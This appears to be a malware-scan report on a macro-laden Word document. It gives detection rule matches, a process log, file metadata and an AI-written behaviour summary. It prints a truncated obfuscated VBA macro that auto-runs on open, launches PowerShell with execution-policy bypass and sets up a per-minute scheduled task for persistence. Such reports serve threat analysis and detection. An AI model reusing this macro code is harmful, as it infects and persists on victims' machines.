threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

crowdsourced_yara_results.description: This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent.

sigma_analysis_results.rule_title: Suspicious New Instance Of An Office COM Object
sigma_analysis_results.rule_description:
Detects an svchost process spawning an instance of an office application. This happens when the initial word application creates an instance of one of the Office COM objects such as 'Word.Application', 'Excel.Application', etc.
This can be used by malicious actors to create malicious Office documents with macros on the fly. (See vba2clr project in the references)

match_context.values: @{TerminalSessionId=1; ProcessGuid={C784477D-820A-6487-4106-000000004D00}; ProcessId=6048; Product=Microsoft Office 2016; Description=Microsoft Word; Company=Microsoft Corporation; ParentProcessGuid={C784477D-B3EB-6481-0E00-000000004D00}; User=DESKTOP-B0T93D6\george; Hashes=MD5=CE33FC3C687D3C01159A8CAEA7F5482E,SHA256=5D75D0EA8BBB5B652F7B72CF728C00322BD486D54A5C4978CEACDF70B4317EE6,IMPHASH=1B2B96B0763DACAFA277667CA093F96D; OriginalFileName=WinWord.exe; ParentImage=C:\Windows\System32\svchost.exe; FileVersion=16.0.4266.1001; ParentProcessId=856; CurrentDirectory=C:\Windows\system32\; CommandLine="C:\Program Files\Microsoft Office\Office16\WINWORD.EXE" /Automation -Embedding; EventID=1; LogonGuid=C784477D-B3F0-6481-3875-030000000000; LogonId=226616; Image=C:\Program Files\Microsoft Office\Office16\WINWORD.EXE; IntegrityLevel=High; ParentCommandLine=C:\Windows\system32\svchost.exe -k DcomLaunch -p; UtcTime=1686602250; RuleName=-}

macros.vba_code:
Private Sub Document_Open()
Call VVVV
Call AAAA
End Sub
Sub AAAA()
Dim A As String
A = "DIM fso   " & vbCrLf & "Set fso = CreateObject(""Scripting.FileSystemObject"") " & vbCrLf & "set Shell0 = CreateObject(""wscript.shell"")" & vbCrLf & "If (fso.FileExists(""C:\ProgramData\WindowsAppPool\quid"")) Then" & vbCrLf & "  Shell0.run """
A = A + Chr(CLng("&H70")) & Chr(CLng("&H6F")) & Chr(CLng("&H77")) & Chr(CLng("&H65")) & Chr(CLng("&H72")) & Chr(CLng("&H73")) & Chr(CLng("&H68")) & Chr(CLng("&H65")) & Chr(CLng("&H6C")) & Chr(CLng("&H6C")) & Chr(CLng("&H2E")) & Chr(CLng("&H65")) & Chr(CLng("&H78")) & Chr(CLng("&H65"))
A = A + " -exec bypass -file C:\ProgramData\WindowsAppPool\AppPool.ps1 "", 0, false" & vbCrLf & "Else" & vbCrLf & "Shell0.run """ & Chr(CLng("&H63")) & Chr(CLng("&H6D")) & Chr(CLng("&H64")) & Chr(CLng("&H2E")) & Chr(CLng("&H65")) & Chr(CLng("&H78")) & Chr(CLng("&H65"))
A = A + " /C schtasks /create /F /sc minute /mo 1 /tn """"\WindowsAppPool\AppPool"""" /tr """"wscript /b """"C
macros.properties: auto-open create-ole obfuscated open-file run-file write-file

attributes.magic: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1, Code page: 1252, Author: AAA, Template: Normal.dotm, Last Saved By: SQ-2, Revision Number: 42, Name of Creating Application: Microsoft Office Word, Total Editing Time: 02:49:00, Create Time/Date: Sun Jul 15 07:15:00 2018, Last Saved Time/Date: Sun Aug 26 13:34:00 2018, Number of Pages: 1, Number of Words: 785, Number of Characters: 4477, Security: 0

crowdsourced_ai_results.analysis: The macros extracted from the document exhibit clear signs of malicious intent. The code contains obfuscated strings, base64 encoding, and suspicious function calls that attempt to create and execute PowerShell scripts for various malicious activities. The macros attempt to create folders, download additional scripts, manipulate network configurations, and perform actions indicative of a malware infection. The code also includes self-replication mechanisms and attempts to disable security features. Overall, the behavior displayed by these macros is highly indicative of malicious intent.

The provided macros exhibit strong indicators of malicious intent and pose a significant security risk. Here's a detailed analysis of the macro behavior:

1. Obfuscated Code: The macros contain obfuscated code, making it challenging to understand their true functionality. This obfuscation is a common tactic used by malware authors to evade detection.

2. Base64 Decoding and File Execution: The macros employ base64 decoding to retrieve and execute files from a remote location. This technique is frequently used by malware to download and install malicious payloads.

3. Suspicious Function Calls: The macros make suspicious function calls, such as `Shell` and `cmd.exe`, which can be used to execute arbitrary commands on the system. These functions are often leveraged by malware to gain control over the infected machine.

4. Attempts at Persistence: The macros attempt to create persistence by creating scheduled tasks and modifying registry settings. This ensures that the malicious code continues to run even after a system reboot.

5. Manipulation of Macro Security Settings: The macros disable security alerts and screen updating, which allows them to operate stealthily without the user's knowledge.

6. Writing Entries in Windows Registry: The macros write entries into the Windows registry, which can be used to modify system settings and compromise its security.

7. Downloading, Writing, and Executing .exe: The macros download executable files (.exe) from remote sources, write them to the file system, and execute them. This behavior is a hallmark of malware that aims to infect the system with malicious code.

8. Self-Replication and Propagation Mechanisms: The macros contain self-replication mechanisms, such as creating copies of themselves in different locations, to ensure their persistence and spread within the system.

9. Disabling Alerts and Screen Updating: The macros disable security alerts and screen updating to operate stealthily and prevent the user from noticing any suspicious activity.

These behaviors collectively indicate that the macros are malicious and pose a significant security risk. They exhibit characteristics commonly associated with malware, such as obfuscation, base64 decoding for file execution, suspicious function calls, attempts at persistence, manipulation of macro security settings, writing entries in the Windows registry, downloading, writing, and executing .exe files, self-replication mechanisms, and disabling alerts and screen updating.

Therefore, it is crucial to take immediate action to remove these macros and protect the system from potential harm.
